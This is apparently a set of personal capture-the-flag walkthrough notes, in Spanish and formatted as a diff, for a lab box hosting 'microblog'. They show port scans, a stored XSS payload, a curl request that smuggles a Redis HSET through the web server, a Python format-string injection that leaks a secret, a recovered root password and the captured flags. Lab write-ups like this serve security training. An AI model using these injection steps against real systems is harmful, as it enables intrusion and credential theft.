@@ -1,0 +1,113 @@
+> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.213 -oG allPorts
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+3000/tcp open  ppp     syn-ack ttl 63
+
+> nmap -sC -sV -p 22,80,3000 -oN targeted 10.10.11.213
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
+|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
+|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
+80/tcp   open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Site doesn't have a title (text/html).
+3000/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://microblog.htb:3000/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+> sudo nano /etc/hosts
+# Others
+10.10.11.213    microblog.htb
+10.10.11.213    app.microblog.htb
+
+## Agregamos un subdominio registandonos y usando la web
+> sudo nano /etc/hosts
+# Others
+10.10.11.213    microblog.htb
+10.10.11.213    app.microblog.htb
+10.10.11.213    marcomania.microblog.htb
+
+##  XSS Stored: Creamos una cabecera mediante la interface web
+-> <script>alert(document.cookie)</script>
+username=k27dpf0d12l42ss7a35n08rcfv
+
+## El campo id es vulnerable a LFI
+> descubrimos 2 usuarios: cooper y git.
+
+
+## El servidor funciona mediante REDIS, para poder convertir nuestra cuenta en Pro debemos apuntar al socket y en formato HSET. HSET básicamente lo que haces cambiar los valores de los campos especificados.
+❯ curl -X HSET "http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:marcomania%20pro%20true%20a/b"
+
+## Enviamos una reverse shell
+
+
+
+> redis-cli -s /run/redis/redis.sock
+
+##En redis 
+> KEYS *
+cooper.dooper
+cooper.dooper:sites
+marcomania
+PHPREDIS_SESSION:k27dpf0d12l42ss7a35n08rcfv
+marcomania:sites
+
+> HGETALL cooper.dooper
+username
+cooper.dooper
+password
+zooperdoopercooper      *****
+first-name
+Cooper
+last-name
+Dooper
+pro
+false
+
+## usamos ssh con el usuario de cooper
+> ssh cooper@10.10.11.213
+> cat user.txt
+9ad914ccec746b7776e4ea34b72e0d64
+
+> sudo -l
+User cooper may run the following commands on format:
+    (root) /usr/bin/license
+
+> cat /usr/bin/license
+
+## En redis
+> redis-cli -s /run/redis/redis.sock
+> HMSET test first-name "{license.__init__.__globals__[secret_encoded]}" last-name test username test
+> exit
+
+> sudo /usr/bin/license -p test
+Plaintext license key:
+------------------------------------------------------
+microblogtest4jOt!mAro\V`]aWy~k{~Ax`6H|3q?0Ac+6'"3cr)b'unCR4ckaBL3Pa$$w0rd'test
+
+Encrypted license key (distribute to customer):
+------------------------------------------------------
+gAAAAABkr5V8WE33PlR5zFHL8hXdB7qkLnAVstwP05-3FhwAj-PdOtPAahVyaXeDEL5n65Jp2Mzv636xZr9fTGY7pLvgwi2qGlV7YHmvYrG-lH22cBy1EjU0TrTweukERvRApPLWLjWmbBakug8cuK_Cf_IL4_gYgrwoD6lPQMv0tYs0XJcSsqg=
+
+
+> su root (password: unCR4ckaBL3Pa$$w0rd)
+> cat /root/root.txt
+e048524146e3d9c7c222bad5477c970c
+
+
+
+redis-cli -s /run/redis/redis.sock
+HMSET test first-name "{license.__init__.__globals__[secret]}" last-name test username test
+
+
+
+
+
+
+
+
+
